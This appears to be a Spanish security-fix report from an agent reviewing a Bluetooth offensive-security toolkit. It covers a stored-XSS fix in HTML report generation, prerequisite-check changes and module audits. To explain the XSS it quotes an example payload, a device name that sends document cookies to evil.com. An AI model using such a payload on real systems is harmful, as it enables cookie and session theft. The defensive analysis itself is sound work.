## Detalle por corrección

### 14. XSS almacenado en `VulnScanner._generate_report()` — **Alta**

**Componente:** `bluesky/modules/scanners/vuln_scanner.py` (método `_generate_report`)

**Descripción del bug:**
`VulnScanner._generate_report()` generaba un tercer reporte HTML (aparte
de `Reporter.to_html()` y `Autopilot._phase_report()`) interpolando
**sin escape HTML**:
- `v['id']`, `v['name']`, `v.get('cve')`, `v['severity']`, `v.get('evidence')`, `v['module']`
- `target` (la MAC)
- `device_info.get('name')`, `device_info.get('class')`, `device_info.get('manufacturer')`

Es el **mismo vector XSS** que ya corregí en `autopilot.py` (ronda 1) y
que z_pulimiento refactorizó en `reporter.py` (ronda 1 de pulimiento).
Un dispositivo Bluetooth cercano que se anuncia como
`<script>fetch('//evil.com/?'+document.cookie)</script>` terminaría
literalmente en el HTML del reporte de vulnerabilidades, ejecutando
JS al abrirlo en navegador.

**Severidad:** Alta (vector real, requiere proximidad física BT).

**Causa raíz:**
- Tres generadores de reporte HTML divergentes en el proyecto, cada uno
  reimplementando el escape a su manera (o no reimplementándolo, como
  en este caso).
- z_pulimiento ya detectó esto en su informe y me lo señaló. También
  creó el helper compartido `utils.format.esc()` que ahora uso.

**Solución aplicada:**

1. Import de `from bluesky.utils.format import esc` al inicio del método.
2. **Todos** los datos dinámicos interpolados en el HTML se envuelven
   con `esc(...)`:
   - `v.get('id', '')`, `v.get('name', '')`, `v.get('cve', 'N/A')`,
     `v.get('evidence', 'N/A')`, `v.get('module', '')`
   - `target`, `device_info.get('name')`, `device_info.get('class')`,
     `device_info.get('manufacturer')`
   - Incluso los counts `len(found)`, `len(critical)`, `len(high)`
     (defensa en profundidad, aunque sean ints).
3. Whitelist para colores de severidad: helper `_sev_color(sev)` que
   solo devuelve `#dc3545` o `#ffc107`, nunca interpola input directo.
4. Saneamiento del `target` al construir el filename:
   ```python
   safe_target = target.replace(":", "").replace("/", "_").replace("\\", "_")
   while ".." in safe_target:
       safe_target = safe_target.replace("..", "_")
   ```
   Defensa en profundidad contra path traversal en el nombre del archivo
   (la validación MAC de BaseModule ya bloquea esto antes, pero si el
   método se llamara directamente con un target malicioso, el filename
   sería seguro).

**Archivos modificados:**
- `bluesky/modules/scanners/vuln_scanner.py`

**Cómo verificar que está corregido:**
```bash
python -m pytest tests/test_security_bugs.py::TestXssVulnScannerReport -v
```

### 15. `test_02_run_all_via_engine` falla por `requires_root` — **Media**

**Componente:** `bluesky/modules/attacks/bluefrag.py`

**Descripción del bug:**
Mi ronda 3 añadió `super().check_prerequisites()` al override de
BlueFrag. Como BlueFrag tiene `requires_root = True`, el check de
`BaseModule` valida `os.geteuid() == 0` y bloquea en CI sin root.

El test `test_02_run_all_via_engine` ejecuta `bluefrag` con
`MODE=info` esperando `success=True`, pero falla con el mensaje
*"El módulo 'bluefrag' requiere privilegios de root"*.

**Severidad:** Media (test roto, no bug de seguridad; deuda técnica
introducida por mi ronda 3).

**Causa raíz:**
- BlueFrag define `requires_root = True` a nivel de clase, pero el
  requisito real depende del modo:
  - `MODE=info` / `MODE=scan`: NO requieren root (solo lectura/simulación)
  - `MODE=exploit` / `MODE=dos`: SÍ requieren root (envío de paquetes raw)
- La semántica de `requires_root` a nivel de clase no captura esta
  distinción.

**Solución aplicada:**

El override de `check_prerequisites` en BlueFrag ahora:
1. NO llama a `super().check_prerequisites()` (evita el check de root
   del padre).
2. Llama directamente a `is_valid_mac()` para validar formato de MAC
   (mismo patrón que `BaseModule`).
3. Verifica root **solo si** `MODE` está en `("exploit", "dos")`.
4. scapy sigue siendo opcional (modo simulación disponible).

```python
mode = (self.options or {}).get("MODE", "scan").lower()
if mode in ("exploit", "dos"):
    if os.name != "posix" or os.geteuid() != 0:
        return False, (f"El módulo 'bluefrag' en modo '{mode}' requiere "
                      "privilegios de root. Ejecuta con sudo.")
```

**Archivos modificados:**
- `bluesky/modules/attacks/bluefrag.py`

**Cómo verificar que está corregido:**
```bash

# O el test que rompía:
python -m pytest tests/test_exploits.py::TestNewModulesEngineIntegration::test_02_run_all_via_engine -v
```

### 16. Crackle exige scapy (modo simulación disponible) — **Media**

**Componente:** `bluesky/modules/attacks/crackle.py`

**Descripción del bug:**
El override de `check_prerequisites` en Crackle bloqueaba con
`"Faltan: scapy (pip install scapy)"` si scapy no estaba instalado,
incluso para modo análisis offline (PCAP_FILE) o modo educativo que
no necesitan scapy.

El test `test_09_check_prerequisites` esperaba `True` (porque "no hay
requisitos obligatorios") pero fallaba en entornos sin scapy.

**Severidad:** Media (test roto, no bug de seguridad; Falta de
consistencia con BlueFrag que sí permite modo simulación).

**Causa raíz:**
- Inconsistencia: BlueFrag permite scapy opcional (modo simulación),
  pero Crackle lo exigía. Ambos módulos son similares (usan scapy para
  captura pero tienen modo simulación).

**Solución aplicada:**

El override de `check_prerequisites` en Crackle ahora:
1. NO llama a `super().check_prerequisites()` (mismo patrón que BlueFrag).
2. Llama directamente a `is_valid_mac()` para validar formato de MAC.
3. scapy NO es blocking: si no está, se loguea como warning y se
   permite el modo simulación/offline.

```python
if not SCAPY_AVAILABLE:
    import logging
    logging.getLogger("bluesky.crackle").warning(
        "scapy no instalado - usando modo simulación/offline")
return True, ""
```

**Archivos modificados:**
- `bluesky/modules/attacks/crackle.py`

**Cómo verificar que está corregido:**
```bash
python -m pytest tests/test_security_bugs.py::TestCrackleScapyNotBlocking -v
```

## Auditoría profunda de módulos pendientes

### `keystroke_injection.py` — **Sin bugs críticos**

**Componente:** `bluesky/modules/exploits/keystroke_injection.py`

**Hallazgos:**
1. **No tiene `module_options` definido** — usa el default de `BaseModule`
   (`{"TARGET": "..."}`). La validación MAC global se aplica correctamente
   vía `BaseModule.check_prerequisites()`.
2. **No hay override de `check_prerequisites`** — la validación de
   `BaseModule` SÍ se aplica (no fue necesario añadir `super()` call
   en ronda 3 porque no había override).
3. **`_inject_ble_hid` pasa `target` a `gatttool -b <target>`** —
   argv separado, no hay shell injection. La validación MAC global
   bloquea targets maliciosos antes de llegar a subprocess.
4. **`payload` se valida contra `HID_KEYBOARD` map** — `_char_to_hex`
   hace lookup contra el mapa, no permite caracteres arbitrarios.
5. **`_send_hid_key` escribe a `/dev/hidg0`** — si no existe, captura
   `IOError/PermissionError` y retorna False. No hay inyección.

**Conclusión:** El módulo es razonablemente seguro. No requiere correcciones.

### `bluebugging.py` — **Sin bugs críticos**

**Componente:** `bluesky/modules/attacks/bluebugging.py`

**Hallazgos:**
1. **`check_prerequisites` ya llama a `super()`** (corregido en ronda 3).
2. **`_try_at_commands` pasa `mac` a `rfcomm bind /dev/rfcomm0 <mac> <channel>`** —
   argv separado. Validación MAC global bloquea inputs maliciosos.
3. **`str(channel)` se pasa como último argumento** — `channel` es int
   parseado por regex `Channel\s*:\s*(\d+)` o de lista hardcoded
   `[1,2,...,10]`. No es inyectable.
4. **`ser.write(f"{cmd}\r\n".encode())`** — `cmd` viene de la lista
   hardcoded `at_commands`. No es inyectable.
5. **`response[:200]` se trunca** — bien, limita tamaño de respuesta.

**Bug funcional menor (no corregido):** En `_try_at_commands`, si
`rfcomm bind` falla (returncode != 0), el código no lo detecta y
continúa intentando abrir el serial. Esto genera errores confusos.
No es bug de seguridad. Lo documento para Implementaciones.

**Conclusión:** El módulo es razonablemente seguro. No requiere correcciones
de seguridad.

## Recomendaciones de seguridad generales para el resto de agentes

### Para el agente **Pulimiento**

1. **Refactor pendiente: consolidar 3 generadores HTML** — ya está
   desbloqueado (XSS resuelto). Podéis unificar los 3 reportes
   (`Reporter.to_html`, `Autopilot._phase_report`,
   `VulnScanner._generate_report`) en un único template con paleta
   única. Sugerencia: que `Reporter` sea el motor central y los otros
   dos deleguen en él.
2. **`utils.format.esc()` ya es la fuente única** — cualquier nuevo
   generador de HTML debe usarlo. No reimplementar `html.escape`.

### Para el agente **Implementaciones**

1. **`bluebugging._try_at_commands` no detecta fallo de `rfcomm bind`**:
   si `subprocess.run(["rfcomm", "bind", ...])` devuelve `returncode != 0`,
   el código continúa intentando abrir el serial. Pequeño bug funcional
   (no de seguridad) que genera errores confusos. Sugerencia: comprobar
   `bind.returncode` antes de continuar.
2. **`keystroke_injection` no tiene `module_options` definido** — usa
   el default de `BaseModule` que dice "Dirección MAC del dispositivo
   objetivo" sin indicar que `script` y `payload` son opciones válidas.
   Añadir `module_options` documentado mejoraría UX.

### Para el **Director**

1. **Política de tests que requieren dependencias externas**: 2 tests
   siguen fallando por falta de `crackle`/`scapy` en CI. Decidir:
   - ¿Instalar `crackle`+`scapy` en el job de CI?
   - ¿O marcarlos con `@pytest.mark.requires_external` y skip?
2. **Política de secretos**: sigo reiterando lo de la ronda 1. El PAT
   de GitHub compartido en el chat sigue expuesto.
3. **Decisión de diseño sobre autenticación en dashboard web**:
   z_pulimiento confirmó que no hay auth si se expone con `--host 0.0.0.0`.
   Como mitigación, se podría:
   - Añadir flag `--token <TOKEN>` que requiera `Authorization: Bearer`.
   - O imprimir warning cuando `--host` no sea `127.0.0.1`.
